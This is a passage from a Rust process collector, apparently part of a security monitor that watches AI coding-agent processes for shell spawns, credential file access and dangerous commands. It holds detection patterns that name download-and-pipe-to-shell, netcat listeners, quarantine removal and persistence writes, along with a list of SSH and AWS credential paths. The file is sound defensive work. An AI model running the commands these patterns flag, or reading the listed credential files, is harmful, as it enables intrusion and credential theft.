use crate::config::Config;
use crate::mitre;
use crate::models::{EventType, ProcessEnrichment, ProcessInfo, SecurityEvent, ThreatLevel};
use crate::stats;
use nix::libc;
use procfs::process::Process;
use rand::Rng;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::Path;
use tokio::sync::broadcast;
use tokio::time::{Duration, sleep};
use tracing::{info, warn};

#[derive(Clone)]
struct ProcessSnapshot {
    info: ProcessInfo,
    enrichment: ProcessEnrichment,
    is_ai_agent: bool,
    start_ticks: Option<u64>,
}

pub struct ProcessCollector {
    cfg: Config,
    tx: broadcast::Sender<SecurityEvent>,
    prev_processes: HashMap<i32, Option<u64>>,
    process_tree: HashMap<i32, Vec<i32>>,
}

impl ProcessCollector {
    /// Builds a process collector that publishes inferred [`SecurityEvent`] values over a broadcast channel.
    pub fn new(cfg: Config, tx: broadcast::Sender<SecurityEvent>) -> Self {
        Self {
            cfg,
            tx,
            prev_processes: HashMap::new(),
            process_tree: HashMap::new(),
        }
    }

    /// Starts continuous process collection and emits events on each polling interval.
    pub async fn run(mut self) {
        loop {
            self.collect_once();
            sleep(jittered_scan_interval(self.cfg.monitor_interval_ms)).await;
        }
    }

    fn collect_once(&mut self) {
        let mut current: HashMap<i32, ProcessSnapshot> = HashMap::new();
        let all = match procfs::process::all_processes() {
            Ok(p) => p,
            Err(err) => {
                warn!(
                    ?err,
                    "unable to enumerate /proc; ensure Leash has permission to read /proc (try running with elevated privileges or grant procfs access)"
                );
                return;
            }
        };

        for proc_result in all {
            let proc = match proc_result {
                Ok(p) => p,
                Err(_) => continue,
            };
            if let Some(snapshot) = self.read_process(&proc) {
                current.insert(snapshot.info.pid, snapshot);
            }
        }

        self.process_tree = self.build_process_tree(&current);
        let (ai_roots, monitored) = self.compute_monitored_sets(&current, &self.process_tree);

        for (pid, snapshot) in &current {
            let is_new = match self.prev_processes.get(pid) {
                Some(previous_start_ticks) => *previous_start_ticks != snapshot.start_ticks,
                None => true,
            };
            if !is_new {
                continue;
            }

            if !monitored.contains(pid) {
                continue;
            }

            for event in self.analyze_monitored_process(*pid, snapshot, &current, &ai_roots) {
                if let Err(err) = self.tx.send(event) {
                    stats::record_dropped_event();
                    warn!(
                        event_type = %err.0.event_type,
                        "dropping event: broadcast channel full or closed"
                    );
                }
            }
        }

        for (pid, previous_start_ticks) in &self.prev_processes {
            let should_emit_exit = match current.get(pid) {
                None => true,
                Some(snapshot) => snapshot.start_ticks != *previous_start_ticks,
            };
            if !should_emit_exit {
                continue;
            }

            let event = mitre::infer_and_tag(SecurityEvent::new(
                EventType::ProcessExit,
                ThreatLevel::Green,
                format!("Process exited: PID {pid}"),
            ));
            if let Err(err) = self.tx.send(event) {
                stats::record_dropped_event();
                warn!(
                    event_type = %err.0.event_type,
                    "dropping event: broadcast channel full or closed"
                );
            }
        }

        self.prev_processes = current
            .iter()
            .map(|(pid, snapshot)| (*pid, snapshot.start_ticks))
            .collect();
    }

    fn analyze_monitored_process(
        &self,
        pid: i32,
        snapshot: &ProcessSnapshot,
        all: &HashMap<i32, ProcessSnapshot>,
        ai_roots: &HashSet<i32>,
    ) -> Vec<SecurityEvent> {
        let mut events = Vec::new();

        let ancestry = self.build_ancestry_chain(pid, all, ai_roots);
        let ancestry_names: Vec<String> = ancestry.iter().map(|(_, name)| name.clone()).collect();
        let ancestry_text = ancestry_names.join(" -> ");

        if let Some(entry) = self.match_allow_list(
            &snapshot.info.name,
            &snapshot.info.cmdline,
            &snapshot.info.exe,
        ) {
            let reason = if entry.reason.trim().is_empty() {
                format!("matched allow_list entry '{}'", entry.name)
            } else {
                entry.reason.clone()
            };
            info!(
                pid = snapshot.info.pid,
                process = %snapshot.info.name,
                allow_name = %entry.name,
                allow_reason = %reason,
                "allowed process observed; suppressing alert delivery"
            );

            let mut event = self.make_event(
                EventType::ProcessNew,
                ThreatLevel::Green,
                format!(
                    "Allowed process observed: {} (pid={}) | ancestry: {}",
                    snapshot.info.name, snapshot.info.pid, ancestry_text
                ),
                snapshot,
                all,
            );
            event.allowed = true;
            event.allowed_reason = Some(reason);
            events.push(event);
            return events;
        }

        let is_descendant = ancestry.len() > 1;
        let process_level = if snapshot.is_ai_agent {
            ThreatLevel::Orange
        } else {
            ThreatLevel::Green
        };
        let process_label = if snapshot.is_ai_agent {
            "AI agent process detected"
        } else {
            "Monitored process observed"
        };

        events.push(self.make_event(
            EventType::ProcessNew,
            process_level,
            format!(
                "{process_label}: {} (pid={}) | ancestry: {}",
                snapshot.info.name, snapshot.info.pid, ancestry_text
            ),
            snapshot,
            all,
        ));

        let lower_name = snapshot.info.name.to_ascii_lowercase();
        if is_descendant && ["bash", "sh", "zsh"].contains(&lower_name.as_str()) {
            events.push(self.make_event(
                EventType::ProcessShellSpawn,
                ThreatLevel::Yellow,
                format!("Monitored shell spawn detected: {ancestry_text}"),
                snapshot,
                all,
            ));
        }

        let credential_hits = detect_credential_paths(&snapshot.enrichment.open_fds);
        if !credential_hits.is_empty() {
            events.push(self.make_event(
                EventType::CredentialAccess,
                ThreatLevel::Red,
                format!(
                    "Monitored process accessed credential material: {ancestry_text} | files={}",
                    credential_hits.join(", ")
                ),
                snapshot,
                all,
            ));
        }

        let parent = all.get(&snapshot.info.ppid);
        let parent_name = parent.map(|p| p.info.name.as_str()).unwrap_or_default();
        let parent_cmdline = parent
            .map(|p| p.info.cmdline.as_str())
            .unwrap_or_default();
        let dangerous_hits = detect_dangerous_commands_with_context(
            &snapshot.info.cmdline,
            &snapshot.enrichment.working_dir,
            &snapshot.info.name,
            parent_name,
            parent_cmdline,
            &ancestry_names,
            &snapshot.enrichment.env,
            &snapshot.info.exe,
        );
        if !dangerous_hits.is_empty() {
            let level = if dangerous_hits.iter().copied().any(detection_is_red) {
                ThreatLevel::Red
            } else {
                ThreatLevel::Orange
            };
            let url = extract_url(&snapshot.info.cmdline).unwrap_or_default();
            let chain = if url.is_empty() {
                ancestry_text.clone()
            } else {
                format!("{ancestry_text} -> {url}")
            };
            events.push(self.make_event(
                EventType::NetworkSuspicious,
                level,
                format!(
                    "Dangerous command pattern(s) [{}] | ancestry: {chain}",
                    dangerous_hits.join(",")
                ),
                snapshot,
                all,
            ));
        }

        // Prompt injection detection in command lines
        if let Some(injection_event) = crate::prompt_injection::scan_cmdline_for_injection(
            &snapshot.info.cmdline,
            snapshot.info.pid,
            &snapshot.info.name,
        ) {
            events.push(injection_event);
        }

        events
    }

    fn make_event(
        &self,
        event_type: EventType,
        threat_level: ThreatLevel,
        narrative: String,
        snapshot: &ProcessSnapshot,
        all: &HashMap<i32, ProcessSnapshot>,
    ) -> SecurityEvent {
        let mut proc = snapshot.info.clone();
        proc.parent_chain = self.build_parent_chain(proc.ppid, all);

        let mut event = SecurityEvent::new(event_type, threat_level, narrative);
        event.process = Some(proc);
        event.enrichment = Some(snapshot.enrichment.clone());
        mitre::infer_and_tag(event)
    }

    fn build_process_tree(&self, all: &HashMap<i32, ProcessSnapshot>) -> HashMap<i32, Vec<i32>> {
        let mut tree: HashMap<i32, Vec<i32>> = HashMap::new();
        for (pid, snapshot) in all {
            tree.entry(snapshot.info.ppid).or_default().push(*pid);
        }
        tree
    }

    fn compute_monitored_sets(
        &self,
        all: &HashMap<i32, ProcessSnapshot>,
        tree: &HashMap<i32, Vec<i32>>,
    ) -> (HashSet<i32>, HashSet<i32>) {
        let mut roots = HashSet::new();
        let mut monitored = HashSet::new();

        for (pid, snapshot) in all {
            if snapshot.is_ai_agent {
                roots.insert(*pid);
                let mut stack = vec![*pid];
                while let Some(current) = stack.pop() {
                    if !monitored.insert(current) {
                        continue;
                    }
                    if let Some(children) = tree.get(&current) {
                        for child in children {
                            stack.push(*child);
                        }
                    }
                }
            }
        }

        (roots, monitored)
    }

    fn build_ancestry_chain(
        &self,
        pid: i32,
        all: &HashMap<i32, ProcessSnapshot>,
        ai_roots: &HashSet<i32>,
    ) -> Vec<(i32, String)> {
        let mut chain = Vec::new();
        let mut current = pid;

        for _ in 0..64 {
            let Some(proc) = all.get(&current) else {
                break;
            };
            chain.push((proc.info.pid, proc.info.name.clone()));
            if ai_roots.contains(&current) || current <= 1 {
                break;
            }
            current = proc.info.ppid;
        }

        chain.reverse();
        chain
    }

    fn build_parent_chain(
        &self,
        start_ppid: i32,
        all: &HashMap<i32, ProcessSnapshot>,
    ) -> Vec<String> {
        let mut chain = Vec::new();
        let mut current = start_ppid;

        for _ in 0..16 {
            if current <= 1 {
                break;
            }
            let Some(parent) = all.get(&current) else {
                break;
            };
            chain.push(format!("{}({})", parent.info.name, parent.info.pid));
            current = parent.info.ppid;
        }

        chain
    }

    fn read_process(&self, proc: &Process) -> Option<ProcessSnapshot> {
        let stat = proc.stat().ok()?;
        let pid = stat.pid;
        let raw_cmdline = proc.cmdline().ok().map(|v| v.join(" ")).unwrap_or_default();
        let raw_exe = proc
            .exe()
            .ok()
            .map(|p| p.display().to_string())
            .unwrap_or_default();
        let raw_cwd = proc
            .cwd()
            .ok()
            .map(|p| p.display().to_string())
            .unwrap_or_default();
        let raw_open_fds = self.read_open_fds(pid);
        let raw_env = self.read_env_of_interest(pid);
        let (memory_rss_kb, memory_vmsize_kb, username) = self.read_status_fields(pid);
        let start_time = self.read_start_time(pid);
        let start_ticks = self.read_start_ticks(pid);
        let is_ai_agent = self.is_ai_agent(&stat.comm, &raw_cmdline, &raw_exe);
        let cmdline = scrub_secrets(&raw_cmdline);
        let exe = scrub_secrets(&raw_exe);
        let cwd = scrub_secrets(&raw_cwd);
        let open_fds = raw_open_fds
            .into_iter()
            .map(|path| scrub_secrets(&path))
            .collect::<Vec<_>>();
        let env = raw_env
            .into_iter()
            .map(|(key, value)| (key, scrub_secrets(&value)))
            .collect::<HashMap<_, _>>();

        let info = ProcessInfo {
            pid,
            ppid: stat.ppid,
            name: stat.comm,
            cmdline: cmdline.clone(),
            exe,
            cwd: cwd.clone(),
            username,
            open_files: open_fds.clone(),
            parent_chain: Vec::new(),
            start_time,
        };

        let enrichment = ProcessEnrichment {
            full_cmdline: cmdline,
            working_dir: cwd,
            env,
            open_fds,
            memory_rss_kb,
            memory_vmsize_kb,
        };

        Some(ProcessSnapshot {
            info,
            enrichment,
            is_ai_agent,
            start_ticks,
        })
    }

    fn read_start_ticks(&self, pid: i32) -> Option<u64> {
        let stat_path = format!("/proc/{pid}/stat");
        let stat = fs::read_to_string(stat_path).ok()?;
        parse_proc_start_ticks(&stat)
    }

    fn read_start_time(&self, pid: i32) -> Option<chrono::DateTime<chrono::Utc>> {
        let stat_path = format!("/proc/{}/stat", pid);
        let stat = match fs::read_to_string(stat_path) {
            Ok(s) => s,
            Err(_) => return None,
        };

        // Start time is field 22 in /proc/pid/stat (comm, state, ppid, pgrp, session, tty_nr, ...)
        // Field indices start at 1, so field 22 is at index 21
        let parts: Vec<&str> = stat.split_whitespace().collect();
        if parts.len() < 22 {
            return None;
        }

        // Field 22 is the start time in clock ticks
        let start_ticks: u64 = match parts[21].parse() {
            Ok(t) => t,
            Err(_) => return None,
        };

        // Get clock ticks per second
        let ticks_per_sec = unsafe { libc::sysconf(libc::_SC_CLK_TCK) } as f64;
        if ticks_per_sec <= 0.0 {
            return None;
        }

        let secs_since_boot = start_ticks as f64 / ticks_per_sec;

        // Calculate absolute time using boot time
        let boot_time = match Self::get_boot_time() {
            Some(bt) => bt,
            None => return None,
        };

        let start_time =
            boot_time + chrono::Duration::milliseconds((secs_since_boot * 1000.0) as i64);
        Some(start_time)
    }

    fn get_boot_time() -> Option<chrono::DateTime<chrono::Utc>> {
        let uptime_path = "/proc/uptime";
        let uptime = match fs::read_to_string(uptime_path) {
            Ok(s) => s,
            Err(_) => return None,
        };

        let uptime_secs: f64 = match uptime.split_whitespace().next().unwrap_or("0").parse() {
            Ok(u) => u,
            Err(_) => return None,
        };

        let now = chrono::Utc::now();
        Some(now - chrono::Duration::seconds(uptime_secs as i64))
    }

    fn is_ai_agent(&self, name: &str, cmdline: &str, exe: &str) -> bool {
        let name = name.to_ascii_lowercase();
        let cmdline = cmdline.to_ascii_lowercase();
        let exe = exe.to_ascii_lowercase();
        let configured_match = self.cfg.ai_agents.iter().any(|agent| {
            let needle = agent.to_ascii_lowercase();
            name.contains(&needle) || cmdline.contains(&needle) || exe.contains(&needle)
        });
        if configured_match {
            return true;
        }

        let cmdline_needles = ["anthropic", "claude-code", "cursor.sh", "opencode"];
        cmdline_needles
            .iter()
            .any(|needle| cmdline.contains(needle) || exe.contains(needle))
    }

    fn match_allow_list<'a>(
        &'a self,
        name: &str,
        cmdline: &str,
        exe: &str,
    ) -> Option<&'a crate::config::AllowListEntry> {
        let name = name.to_ascii_lowercase();
        let cmdline = cmdline.to_ascii_lowercase();
        let exe = exe.to_ascii_lowercase();

        self.cfg
            .allow_list
            .iter()
            .find(|entry| allow_list_entry_matches(&entry.name, &name, &cmdline, &exe))
    }

    fn read_open_fds(&self, pid: i32) -> Vec<String> {
        let mut fds = Vec::new();
        const MAX_OPEN_FDS_CAPTURED: usize = 512;
        let fd_dir = format!("/proc/{pid}/fd");
        let entries = match fs::read_dir(fd_dir) {
            Ok(entries) => entries,
            Err(_) => return fds,
        };

        for entry in entries.flatten() {
            if let Ok(target) = fs::read_link(entry.path()) {
                fds.push(target.display().to_string());
            }
            if fds.len() >= MAX_OPEN_FDS_CAPTURED {
                break;
            }
        }

        fds
    }

    fn read_env_of_interest(&self, pid: i32) -> HashMap<String, String> {
        let mut out = HashMap::new();
        let env_path = format!("/proc/{pid}/environ");
        let bytes = match fs::read(env_path) {
            Ok(data) => data,
            Err(_) => return out,
        };

        for item in bytes.split(|b| *b == 0).filter(|s| !s.is_empty()) {
            let entry = String::from_utf8_lossy(item);
            let mut parts = entry.splitn(2, '=');
            let key = parts.next().unwrap_or_default();
            let value = parts.next().unwrap_or_default();
            if matches!(key, "PATH" | "HOME" | "USER" | "LD_PRELOAD")
                || key.eq_ignore_ascii_case("_MEIPASS")
                || key.eq_ignore_ascii_case("_MEIPASS2")
            {
                out.insert(key.to_string(), value.to_string());
            }
        }

        out
    }

    fn read_status_fields(&self, pid: i32) -> (Option<u64>, Option<u64>, String) {
        let status_path = format!("/proc/{pid}/status");
        let status = match fs::read_to_string(status_path) {
            Ok(raw) => raw,
            Err(_) => return (None, None, String::new()),
        };

        let mut vmrss = None;
        let mut vmsize = None;
        let mut username = String::new();

        for line in status.lines() {
            if let Some(rest) = line.strip_prefix("VmRSS:") {
                vmrss = parse_status_kb(rest);
            } else if let Some(rest) = line.strip_prefix("VmSize:") {
                vmsize = parse_status_kb(rest);
            } else if let Some(rest) = line.strip_prefix("Uid:") {
                username = rest
                    .split_whitespace()
                    .next()
                    .unwrap_or_default()
                    .to_string();
            }
        }

        (vmrss, vmsize, username)
    }
}

fn parse_status_kb(raw: &str) -> Option<u64> {
    raw.split_whitespace().next()?.parse::<u64>().ok()
}

fn parse_proc_start_ticks(stat: &str) -> Option<u64> {
    let close = stat.rfind(')')?;
    let tail = stat.get(close + 2..)?;
    let fields: Vec<&str> = tail.split_whitespace().collect();
    let start_ticks_index = 19;
    fields.get(start_ticks_index)?.parse::<u64>().ok()
}

#[allow(deprecated)]
fn jittered_scan_interval(base_ms: u64) -> Duration {
    let mut rng = rand::thread_rng();
    let jitter = rng.gen_range(-0.20_f64..=0.20_f64);
    let adjusted_ms = ((base_ms as f64) * (1.0 + jitter)).round().max(1.0) as u64;
    Duration::from_millis(adjusted_ms)
}

/// Redacts common secret formats from arbitrary text before logging or alerting.
pub fn scrub_secrets(input: &str) -> String {
    let mut output = redact_prefixed_alnum_secret(input, "sk-", 20);
    for prefix in ["AKIA", "ABIA", "ACCA", "ASIA"] {
        output = redact_fixed_alnum_secret(&output, prefix, 16);
    }
    redact_assignment_secrets(&output)
}

fn redact_prefixed_alnum_secret(input: &str, prefix: &str, min_tail_len: usize) -> String {
    let mut output = String::with_capacity(input.len());
    let mut idx = 0;
    while idx < input.len() {
        let Some(found) = input[idx..].find(prefix) else {
            output.push_str(&input[idx..]);
            break;
        };
        let start = idx + found;
        output.push_str(&input[idx..start]);

        let tail_start = start + prefix.len();
        let tail_len = input[tail_start..]
            .chars()
            .take_while(|ch| ch.is_ascii_alphanumeric())
            .count();
        if tail_len >= min_tail_len {
            output.push_str("[REDACTED]");
            idx = tail_start + tail_len;
        } else {
            output.push_str(prefix);
            idx = tail_start;
        }
    }
    output
}

fn redact_fixed_alnum_secret(input: &str, prefix: &str, tail_len: usize) -> String {
    let mut output = String::with_capacity(input.len());
    let mut idx = 0;
    while idx < input.len() {
        let Some(found) = input[idx..].find(prefix) else {
            output.push_str(&input[idx..]);
            break;
        };
        let start = idx + found;
        output.push_str(&input[idx..start]);

        let secret_start = start + prefix.len();
        let tail = input[secret_start..]
            .chars()
            .take(tail_len)
            .collect::<String>();
        if tail.chars().count() == tail_len
            && tail
                .chars()
                .all(|ch| ch.is_ascii_uppercase() || ch.is_ascii_digit())
        {
            output.push_str("[REDACTED]");
            idx = secret_start + tail_len;
        } else {
            output.push_str(prefix);
            idx = secret_start;
        }
    }
    output
}

fn redact_assignment_secrets(input: &str) -> String {
    let keys = ["api_key", "secret", "token", "password"];
    let mut output = String::with_capacity(input.len());
    let mut idx = 0;
    while idx < input.len() {
        let current = input[idx..].chars().next().unwrap_or_default();
        if current.is_ascii_alphabetic() {
            let key_start = idx;
            while idx < input.len() {
                let ch = input[idx..].chars().next().unwrap_or_default();
                if ch.is_ascii_alphanumeric() || ch == '_' {
                    idx += ch.len_utf8();
                } else {
                    break;
                }
            }
            let key = &input[key_start..idx];
            if idx < input.len()
                && input[idx..].starts_with('=')
                && keys
                    .iter()
                    .any(|candidate| key.eq_ignore_ascii_case(candidate))
            {
                output.push_str(key);
                output.push('=');
                idx += 1;
                let secret_start = idx;
                while idx < input.len() {
                    let ch = input[idx..].chars().next().unwrap_or_default();
                    if ch.is_ascii_whitespace() || ch == '&' {
                        break;
                    }
                    idx += ch.len_utf8();
                }
                let secret_len = idx.saturating_sub(secret_start);
                if secret_len >= "[REDACTED]".len() {
                    output.push_str("[REDACTED]");
                } else {
                    output.push_str(&"*".repeat(secret_len));
                }
                continue;
            }
            output.push_str(key);
            continue;
        }

        output.push(current);
        idx += current.len_utf8();
    }

    output
}

fn extract_url(cmdline: &str) -> Option<String> {
    cmdline
        .split_whitespace()
        .find(|part| part.starts_with("http://") || part.starts_with("https://"))
        .map(ToString::to_string)
}

fn detect_credential_paths(open_fds: &[String]) -> Vec<String> {
    const TARGETS: &[&str] = &[
        "/.ssh/id_rsa",
        "/.ssh/id_ed25519",
        "/.ssh/known_hosts",
        "/.aws/credentials",
        "/.aws/config",
        "/.gitconfig",
        "/.npmrc",
        "/.netrc",
    ];

    open_fds
        .iter()
        .filter_map(|fd| {
            let normalized = fd.to_ascii_lowercase();
            TARGETS
                .iter()
                .find(|needle| normalized.ends_with(**needle))
                .map(|_| fd.clone())
        })
        .take(6)
        .collect()
}

#[cfg(test)]
fn detect_dangerous_commands(cmdline: &str, working_dir: &str) -> Vec<&'static str> {
    let empty_ancestry = Vec::new();
    let empty_env = HashMap::new();
    detect_dangerous_commands_with_context(
        cmdline,
        working_dir,
        "",
        "",
        "",
        &empty_ancestry,
        &empty_env,
        "",
    )
}

fn detect_dangerous_commands_with_context(
    cmdline: &str,
    working_dir: &str,
    process_name: &str,
    parent_name: &str,
    parent_cmdline: &str,
    ancestry_names: &[String],
    env: &HashMap<String, String>,
    exe: &str,
) -> Vec<&'static str> {
    let lower = canonicalize_for_detection(cmdline);
    let lower_process = process_name.to_ascii_lowercase();
    let lower_parent = parent_name.to_ascii_lowercase();
    let lower_parent_cmdline = canonicalize_for_detection(parent_cmdline);
    let lower_working_dir = working_dir.to_ascii_lowercase();
    let lower_exe = exe.to_ascii_lowercase();
    let mut hits = Vec::new();

    if (lower.contains("xattr -c ") || lower.contains("xattr -c\t"))
        || (lower.contains("xattr ")
            && lower.contains("-d com.apple.quarantine")
            && !lower.contains("-rd com.apple.quarantine"))
        || (lower.contains("xattr ") && lower.contains("-rd com.apple.quarantine"))
    {
        hits.push("gatekeeper_bypass");
    }

    if lower.contains("osascript") && lower.contains("/tmp/") {
        hits.push("osascript_tmp_exec");
    }

    if lower.contains("osascript")
        && lower.contains(" -e ")
        && (lower.contains("system events")
            || lower.contains("keystroke")
            || lower.contains("password"))
    {
        hits.push("osascript_inline_sensitive");
    }

    if lower.contains("osacompile") && lower.contains("curl ") {
        hits.push("osacompile_with_curl");
    }

    if lower.contains("curl ")
        && lower.contains("|")
        && lower.contains("base64 -d")
        && lower.contains("gunzip")
    {
        hits.push("fileless_pipeline_decode");
    }

    if lower.contains("curl ") && (lower.contains("| python3") || lower.contains("| python")) {
        hits.push("fileless_pipeline_python");
    }

    if (lower.contains("curl ")
        || lower.contains("wget ")
        || lower.contains("fetch ")
        || lower.contains("http://")
        || lower.contains("https://"))
        && (lower.contains("| bash")
            || lower.contains("| sh")
            || lower.contains("| /bin/bash")
            || lower.contains("| /bin/sh"))
    {
        hits.push("download_pipe_shell");
    }

    if lower.contains("wget ")
        && (lower.contains("-o - | sh")
            || lower.contains("-o -|sh")
            || lower.contains("-o- | sh")
            || lower.contains("-o- |sh"))
    {
        hits.push("wget_pipe_shell");
    }

    if lower.contains("base64 -d") || lower.contains("base64 --decode") {
        hits.push("base64_decode");
    }

    if (lower.contains("python -c") || lower.contains("python3 -c")) && lower.contains("base64") {
        hits.push("encoded_python");
    }

    if lower.contains(" eval ") || lower.starts_with("eval ") {
        hits.push("eval_execution");
    }

    if let Some(host) = extract_ssh_target_host(&lower)
        && is_unusual_ssh_host(&host)
    {
        hits.push("ssh_unusual_host");
    }

    if (lower.starts_with("nc ") || lower.contains(" nc ") || lower.starts_with("ncat "))
        && lower.contains(" -l")
    {
        hits.push("netcat_listener");
    }

    if lower.contains("alias ") && (lower.contains("=curl") || lower.contains("=wget")) {
        hits.push("command_aliasing");
    }

    if lower.contains("env ") && (lower.contains(" curl ") || lower.contains(" wget ")) {
        hits.push("indirect_exec_env");
    }

    if lower.contains("xargs ") && (lower.contains(" curl") || lower.contains(" wget")) {
        hits.push("indirect_exec_xargs");
    }

    if lower.contains("find ")
        && lower.contains(" -exec ")
        && (lower.contains("curl") || lower.contains("wget") || lower.contains("bash"))
    {
        hits.push("indirect_exec_find");
    }

    if lower.contains("chmod +x")
        && (lower.contains("http://")
            || lower.contains("https://")
            || lower.contains("curl ")
            || lower.contains("wget ")
            || lower.contains("/tmp/")
            || lower.contains("/dev/shm/")
            || working_dir.starts_with("/tmp"))
    {
        hits.push("download_exec");
    }

    if lower.contains("chmod +x")
        && (lower.contains("/tmp/") || lower.contains("/dev/shm/"))
        && (lower.contains("curl ") || lower.contains("wget ") || lower.contains("http://"))
    {
        hits.push("download_exec_tmpdir");
    }

    if lower.contains("/tmp/") || lower.contains("/dev/shm/") {
        let tokens: Vec<&str> = lower.split_whitespace().collect();
        if let Some(first) = tokens.first().copied() {
            if first.starts_with("/tmp/")
                || first.starts_with("/dev/shm/")
                || ((first == "bash"
                    || first == "sh"
                    || first == "zsh"
                    || first == "python"
                    || first == "python3")
                    && tokens.get(1).is_some_and(|next| {
                        next.starts_with("/tmp/") || next.starts_with("/dev/shm/")
                    }))
            {
                hits.push("exec_tmpdir");
            }
        }
    }

    if lower.contains("curl ")
        && has_non_rfc1918_ipv4_url(&lower, "curl")
        && !hits.contains(&"curl_raw_ip")
    {
        hits.push("curl_raw_ip");
    }

    if lower.contains("wget ")
        && has_non_rfc1918_ipv4_url(&lower, "wget")
        && !hits.contains(&"wget_raw_ip")
    {
        hits.push("wget_raw_ip");
    }

    if writes_launchd_paths(&lower) {
        hits.push("launchd_persistence");
    }

    if reads_kube_config(&lower) {
        hits.push("kube_config_access");
    }

    if (lower.contains("touch ") || lower.contains("mkdir ")) && references_sensitive_paths(&lower)
    {
        hits.push("touch_mkdir_sensitive");
    }

    if references_sensitive_paths(&lower)
        && (lower.contains(" > /etc")
            || lower.contains(" >> /etc")
            || lower.contains("tee /etc")
            || lower.contains("cp ")
            || lower.contains("mv ")
            || lower.contains("install "))
    {
        hits.push("write_sensitive_path");
    }

    if is_rmm_tool_name(&lower_process) && has_suspicious_rmm_parent(&lower_parent) {
        hits.push("rmm_suspicious_parent");
    }

    if is_shell_name(&lower_process)
        && is_package_manager_name(&lower_parent)
        && lower_parent_cmdline.contains(" install")
    {
        hits.push("npm_pip_postinstall_shell");
    }

    if contains_hidden_unicode(cmdline) {
        hits.push("hidden_unicode_command");
    }

    if looks_like_file_read_command(&lower)
        && reads_agent_credential_files(&lower)
        && ancestry_contains_ai_runtime(ancestry_names)
    {
        hits.push("ai_agent_credential_access");
    }

    if in_ai_skill_directory(&lower_working_dir) {
        hits.push("ai_skill_directory_spawn");
    }

    if is_pyinstaller_unexpected_location(env, &lower, &lower_exe) {
        hits.push("pyinstaller_unexpected_location");
    }

    if lower_parent_cmdline.contains(" install")
        && is_package_manager_name(&lower_parent)
        && looks_like_network_child_process(&lower_process, &lower)
        && contains_public_ipv4_reference(&lower)
    {
        hits.push("package_install_external_ip");
    }

    if env.keys().any(|key| key.eq_ignore_ascii_case("LD_PRELOAD")) {
        hits.push("ld_preload_set");
    }

    if lower.contains("crontab -e") || writes_cron_path(&lower) {
        hits.push("crontab_modification");
    }

    if writes_authorized_keys(&lower) {
        hits.push("ssh_authorized_keys_modification");
    }

    hits
}

fn detection_is_red(hit: &str) -> bool {
    matches!(
        hit,
        "write_sensitive_path"
            | "download_exec"
            | "download_exec_tmpdir"
            | "encoded_python"
            | "rmm_suspicious_parent"
            | "hidden_unicode_command"
            | "ai_agent_credential_access"
            | "pyinstaller_unexpected_location"
            | "ld_preload_set"
            | "ssh_authorized_keys_modification"
    )
}

fn canonicalize_for_detection(input: &str) -> String {
    let stripped = strip_zero_width_chars(input);
    let decoded_hex = decode_hex_escapes(&stripped);
    let decoded_percent = decode_percent_escapes(&decoded_hex);
    let mapped = map_common_confusables(&decoded_percent);
    mapped
        .chars()
        .map(|ch| {
            if ch.is_control() {
                ' '
            } else {
                ch.to_ascii_lowercase()
            }
        })
        .collect()
}

fn strip_zero_width_chars(input: &str) -> String {
    input
        .chars()
        .filter(|ch| {
            !matches!(
                ch,
                '\u{200b}' | '\u{200c}' | '\u{200d}' | '\u{2060}' | '\u{feff}'
            )
        })
        .collect()
}

fn decode_hex_escapes(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len());
    let mut idx = 0;
    while idx < bytes.len() {
        if bytes[idx] == b'\\'
            && idx + 3 < bytes.len()
            && (bytes[idx + 1] == b'x' || bytes[idx + 1] == b'X')
            && bytes[idx + 2].is_ascii_hexdigit()
            && bytes[idx + 3].is_ascii_hexdigit()
        {
            let value = std::str::from_utf8(&bytes[idx + 2..idx + 4])
                .ok()
                .and_then(|hex| u8::from_str_radix(hex, 16).ok())
                .unwrap_or_default();
            out.push(value as char);
            idx += 4;
            continue;
        }
        let ch = input[idx..].chars().next().unwrap_or_default();
        out.push(ch);
        idx += ch.len_utf8();
    }
    out
}

fn decode_percent_escapes(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = String::with_capacity(input.len());
    let mut idx = 0;
    while idx < bytes.len() {
        if bytes[idx] == b'%'
            && idx + 2 < bytes.len()
            && bytes[idx + 1].is_ascii_hexdigit()
            && bytes[idx + 2].is_ascii_hexdigit()
        {
            let value = std::str::from_utf8(&bytes[idx + 1..idx + 3])
                .ok()
                .and_then(|hex| u8::from_str_radix(hex, 16).ok())
                .unwrap_or_default();
            out.push(value as char);
            idx += 3;
            continue;
        }
        let ch = input[idx..].chars().next().unwrap_or_default();
        out.push(ch);
        idx += ch.len_utf8();
    }
    out
}

fn map_common_confusables(input: &str) -> String {
    input
        .chars()
        .map(|ch| match ch {
            'е' | 'Е' | 'Ｅ' => 'e',
            'а' | 'А' | 'Ａ' => 'a',
            'о' | 'О' | 'Ｏ' => 'o',
            'с' | 'Ｃ' => 'c',
            'р' | 'Ｐ' => 'p',
            'х' | 'Х' | 'Ｘ' => 'x',
            'у' | 'Ｙ' => 'y',
            'к' | 'Ｋ' => 'k',
            'і' | 'Ｉ' => 'i',
            '⁄' | '∕' | '／' => '/',
            _ => ch,
        })
        .collect()
}

fn extract_ssh_target_host(cmdline: &str) -> Option<String> {
    let tokens: Vec<&str> = cmdline.split_whitespace().collect();
    if tokens.first().copied() != Some("ssh") {
        return None;
    }

    let mut idx = 1;
    while idx < tokens.len() {
        let tok = tokens[idx];
        if tok == "-p" || tok == "-i" || tok == "-l" || tok == "-o" || tok == "-f" || tok == "-n" {
            idx += 2;
            continue;
        }
        if tok.starts_with('-') {
            idx += 1;
            continue;
        }

        let host = tok
            .split('@')
            .next_back()
            .unwrap_or_default()
            .trim_matches(|c| c == '[' || c == ']')
            .to_string();
        return (!host.is_empty()).then_some(host);
    }

    None
}

fn is_unusual_ssh_host(host: &str) -> bool {
    if host == "localhost" || host == "127.0.0.1" || host == "::1" {
        return false;
    }
    if host.ends_with(".local") || host.ends_with(".lan") || host.ends_with(".internal") {
        return false;
    }

    if let Some((a, b, _, _)) = parse_ipv4_octets(host) {
        if a == 10 {
            return false;
        }
        if a == 172 && (16..=31).contains(&b) {
            return false;
        }
        if a == 192 && b == 168 {
            return false;
        }
    }

    true
}

fn references_sensitive_paths(text: &str) -> bool {
    text.contains("/etc/") || text.contains("/usr/bin/") || text.contains("/bin/")
}

fn has_non_rfc1918_ipv4_url(cmdline: &str, tool_name: &str) -> bool {
    cmdline.split_whitespace().any(|token| {
        if !token.starts_with("http://") && !token.starts_with("https://") {
            return false;
        }
        let host = token
            .trim_start_matches("http://")
            .trim_start_matches("https://")
            .split('/')
